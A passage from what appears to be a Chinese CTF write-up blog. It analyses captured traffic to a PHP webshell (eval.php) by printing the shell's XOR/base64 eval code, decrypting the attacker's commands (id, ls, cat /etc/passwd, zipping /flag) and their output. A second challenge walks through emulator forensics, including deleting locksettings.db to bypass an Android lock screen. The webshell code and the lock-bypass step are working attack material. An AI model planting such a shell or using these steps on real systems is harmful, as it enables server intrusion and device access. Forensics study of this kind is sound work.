class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;HBUARVJfUxFTFxAIWENEBUFNSAw%2BOBI6ZSAwCFhDRAVBTUgMPjhQEFgG.....&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)),<span class="hljs-variable">$key</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    在一次请求中，发送了大量的数据</span><br><span class="hljs-comment">    对数据解密之后获得一段代码</span><br><span class="hljs-comment">    代码较长，只截取重要部分</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$parameters</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$_SES</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-variable">$pms</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$ERRMSG</span>;<br><br>    <span class="hljs-title function_ invoke__">reDefSystemFunc</span>();<br>    <span class="hljs-variable">$_SES</span>=&amp;<span class="hljs-title function_ invoke__">getSession</span>();<br>    @<span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$sessioId</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">session_id</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>]))&#123;<br>        <span class="hljs-variable">$_SES</span>=<span class="hljs-title function_ invoke__">unserialize</span>((<span class="hljs-title function_ invoke__">S1MiwYYr</span>(<span class="hljs-title function_ invoke__">base64Decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>],<span class="hljs-variable">$sessioId</span>),<span class="hljs-variable">$sessioId</span>)));<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">session_write_close</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">canCallGzipDecode</span>()==<span class="hljs-number">1</span>&amp;&amp;@<span class="hljs-title function_ invoke__">isGzipStream</span>(<span class="hljs-variable">$pms</span>))&#123;<br>        <span class="hljs-variable">$pms</span>=<span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-variable">$pms</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            从这里看出恶意用户执行的命令，不仅经过eval.php的解密</span><br><span class="hljs-comment">            还要进行一次gzdecode</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>    <span class="hljs-title function_ invoke__">formatParameter</span>(<span class="hljs-variable">$pms</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SES</span>[<span class="hljs-string">&quot;bypass_open_basedir&quot;</span>])&amp;&amp;<span class="hljs-variable">$_SES</span>[<span class="hljs-string">&quot;bypass_open_basedir&quot;</span>]==<span class="hljs-literal">true</span>)&#123;<br>        @<span class="hljs-title function_ invoke__">bypass_open_basedir</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_existsEx</span>(<span class="hljs-string">&quot;set_error_handler&quot;</span>))&#123;<br>        @<span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;payloadErrorHandler&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_existsEx</span>(<span class="hljs-string">&quot;set_exception_handler&quot;</span>))&#123;<br>        @<span class="hljs-title function_ invoke__">set_exception_handler</span>(<span class="hljs-string">&quot;payloadExceptionHandler&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$result</span>=@<span class="hljs-title function_ invoke__">evalFunc</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>==<span class="hljs-literal">null</span>||<span class="hljs-variable">$result</span>===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable">$ERRMSG</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SES</span>!==<span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$sessioId</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">S1MiwYYr</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SES</span>),<span class="hljs-variable">$sessioId</span>));<br>        @<span class="hljs-title function_ invoke__">session_write_close</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">canCallGzipEncode</span>())&#123;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">gzencode</span>(<span class="hljs-variable">$result</span>,<span class="hljs-number">6</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            从这里可以看出，返回的数据先进行了gzencode，然后再是eval.php的加密</span><br><span class="hljs-comment">            </span><br><span class="hljs-comment">        */</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用命令<code>tshark -r dasflow.pcapng -T fields -e text -Y &quot;http contains eval.php or http contains PHPSESSID&quot;</code>获取恶意用户发送和服务器返回的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj6PzFxueQcYzczMg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj6PzFxueQcYzczMg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZk&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZkgaFuZ7LRQshTUz294lUGxjNTk=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZigYcv3nT/BNgTUzmc2wYmxjNTk=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zi64+Ds0VTQhjsQY8BRPyCrY2Nc3rMIcDDCIbRk+e9Cor9ykIJ9Gsl0zKfuMVE5XokKpeKRqt3rZnvp2eHTEDhbeeedepetBoZ2Dep0/+SVgE0BxQgLxLV9M7RheDCgxiQpFV9mQfNl2T2PI2eE6435U0MeIlGQ4ZQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zqj5cnibtPMurvuY4nsse68v+er6Hq31hKszuCVScXY95SXo47T4xKF1GTONQKUqUGM1OQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2ZjBlcX1/rfQu1mV7+X8pYbVLG/AefClpVTHi1zA2QeegNC45MTY=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj7iWMG0Got0GX7+Rk0fq5M+HLQNGQWzDVrJzI2ZQ==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZk&quot;</span>);<br><span class="hljs-variable">$comm</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;VQAVX1xWeARbAGExOTE2EF0WFQ==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGEyOTE2A2cGDVhAVw==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGExOTE2EF0WFQ==&quot;</span>,<span class="hljs-string">&quot;VQAVX1xWeARbAGE4OTE2A10RI1ZAW1UWfwsFWg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4KTJnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY1jYWJ40OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1RTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdcYqqt69fxiNgjXMgT/fxus/iqSfvV8U4Y+Dy+ae39Aq/moLvlyMDZDd1wCYzMyNg==&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDVnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY908xXE0OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1ZTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDXlbmMG1mtWrXoe+/4qxy6veFzTMA51yCl6Rfz5qHupKDQ5qyDB1TdhNzM=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1JTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4TDXl6mJkVIo2Uvt+H/+teZQo+XRU1GLSKMx/fkT4qvsor344MYC0Q5YyNzMy&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1NTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdd4NDEFi2IFqHVIqP98w32pewCBM9N6myx1E6/4/n/6LjdllCHsW3lkOGU=&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mij7dMD/qHMAs1VTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdf4KTJnCYNlV/QoTP77fccu+igG1z9beslwKBf5/P97qX1kY1jYWJ40OGVh&quot;</span>,<span class="hljs-string">&quot;J+5pNzMyNmU2mm75CDu2VDRlodXZFXRiAWzZDTEfmIYnJ3OfU57uD0vbvTa3fKCJ6A8R+ZYyG+ZRZOw6ZGl8pagIpszvET+fp0xgX18NH8Eae5ue2n5F7YT3CmDGuoiuS1HCdA3Nmht1OGM1OQ==&quot;</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$comm</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>((<span class="hljs-variable">$comm</span>[<span class="hljs-variable">$i</span>])),<span class="hljs-variable">$key</span>));<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$result</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>((<span class="hljs-variable">$result</span>[<span class="hljs-variable">$i</span>])),<span class="hljs-variable">$key</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/* 执行的命令</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;id&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;whoami&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls /&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;ls ..&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;d&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;id&quot;</span><br><span class="hljs-comment">sh -c &quot;cd &quot;/var/www/html/upload/&quot;;cat /etc/passwd&quot;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*命令的结果</span><br><span class="hljs-comment">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-comment">www-data</span><br><span class="hljs-comment">eval.php</span><br><span class="hljs-comment">0</span><br><span class="hljs-comment">bin</span><br><span class="hljs-comment">boot</span><br><span class="hljs-comment">dev</span><br><span class="hljs-comment">etc</span><br><span class="hljs-comment">flag</span><br><span class="hljs-comment">home</span><br><span class="hljs-comment">initrd.img</span><br><span class="hljs-comment">initrd.img.old</span><br><span class="hljs-comment">lib</span><br><span class="hljs-comment">lib32</span><br><span class="hljs-comment">lib64</span><br><span class="hljs-comment">libx32</span><br><span class="hljs-comment">lost+found</span><br><span class="hljs-comment">media</span><br><span class="hljs-comment">mnt</span><br><span class="hljs-comment">opt</span><br><span class="hljs-comment">proc</span><br><span class="hljs-comment">root</span><br><span class="hljs-comment">run</span><br><span class="hljs-comment">sbin</span><br><span class="hljs-comment">srv</span><br><span class="hljs-comment">sys</span><br><span class="hljs-comment">tmp</span><br><span class="hljs-comment">usr</span><br><span class="hljs-comment">var</span><br><span class="hljs-comment">vmlinuz</span><br><span class="hljs-comment">vmlinuz.old</span><br><span class="hljs-comment">index.nginx-debian.html</span><br><span class="hljs-comment">index.php</span><br><span class="hljs-comment">index1.html</span><br><span class="hljs-comment">upload</span><br><span class="hljs-comment">  adding: flag (stored 0%)</span><br><span class="hljs-comment">sh: 1: d: not found</span><br><span class="hljs-comment">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>从命令中发现，服务器中存在<code>flag</code>文件，恶意用户对其进行了加密压缩，解压缩密码为<code>airDAS1231qaSW@</code>，压缩包文件为<code>flag.zip</code>,从数据包中找到并导出<code>flag.zip</code>，解压缩之后获得<code>flag</code></p><h2 id="机你太美">机你太美</h2><p><code>npbk文件</code>是夜神模拟器的备份文件，导入文件创建模拟器,开机之后发现存在密码，使用adb连接模拟器，进入<code>/data/system</code>目录，删除<code>locksettings.db</code>文件之后重启模拟器，发现不需要密码了</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E.jpg" srcset="/img/loading.gif" lazyload alt=""><br>模拟器中除去自带的软件之外，安装了<code>QQ</code>和<code>Skred</code>，<code>QQ</code>是登不进去的，从<code>Skred</code>中发现了通信的记录，记录中一个备注为<code>bbb</code>的人向模拟器发送了多个压缩包和两张图片</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>所有的压缩包都带有密码，那只能先从两张图片中找线索了<br>从<code>1675921115230.jpg</code>的<code>A2</code>通道中发现数据<br><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-2.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br>a=cv2.imread(<span class="hljs-string">&#x27;1675921115230.jpg&#x27;</span>,cv2.IMREAD_UNCHANGED)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">if</span> j[<span class="hljs-number">3</span>]==<span class="hljs-number">255</span>:<br>            f.write(<span class="hljs-string">&quot;1&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            f.write(<span class="hljs-string">&quot;0&quot;</span>)<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将数据A2通道的数据导出之后得到解密异常位置得到</span><br><span class="hljs-string">        e01544a9333ef62a3aa27357eb52ea8a</span><br><span class="hljs-string">      这是72f3.zip的密码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-%E6%9C%BA%E4%BD%A0%E5%A4%AA%E7%BE%8E-3.jpg" srcset="/img/loading.gif" lazyload alt=""><br>查看另一张图片的<code>exif</code>信息发现，在<code>User Comment</code>中提示需要异或<code>DASCTF2022</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=<span class="hljs-string">b&#x27;DASCTF2022&#x27;</span><br>d1=f.read()<br>e=[]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    e.append(v^d[i%<span class="hljs-number">10</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将flag文件的内容异或DASCTF2022后得到flag</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IO结构体分析</title>
    <link href="/page/heap/IO%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/"/>
    <url>/page/heap/IO%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/</url>
    
